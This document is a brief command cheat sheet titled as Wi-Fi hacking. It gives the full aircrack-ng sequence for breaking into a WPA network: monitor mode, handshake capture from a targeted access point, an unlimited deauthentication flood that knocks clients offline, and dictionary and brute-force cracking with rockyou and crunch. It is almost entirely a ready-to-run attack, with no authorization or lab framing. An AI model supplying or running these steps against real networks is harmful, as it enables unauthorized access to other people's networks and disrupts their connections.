Wifi-Hacking-Commands-Latest

**First Terminal**
iwconfig
**If you found Adapter Driver Issue**
{
Realtek RTL8188FTV Wireless LAN 802.11n USB 2.0 Network Adapter
First check your USB
lsusb
apt update
apt-get upgrade
apt-get dist-upgrade -y
apt install dkms
apt install realtek-rtl88xxau-dkms
}
airmon-ng check
airmon-ng check kill
**START**
airmon-ng start wlan0
**STOP**
(airmon-ng stop wlan0
service Network Manager restart)
airodump-ng wlan0
**For Address Wifi devices**
airodump-ng wlan0 -d D2:A7:C6:7E:83:5B
airodump-ng -w hack1 -c 1 --bssid D2:A7:C6:7E:83:5B wlan0
**Second Terminal**
aireplay-ng --deauth 0 -a D2:A7:C6:7E:83:5B wlan0
**Unzip the rockyou file**
gunzip /usr/share/wordlists/rockyou.txt.gz
**after crack hack1-01.cap file by dictionery attack**
aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt
**after crack hack1-01.cap file by brute force attack**
crunch  8 12 pbcedfeg | aircrack-ng hack1-01.cap -b D2:A7:C6:7E:83:5B -w-
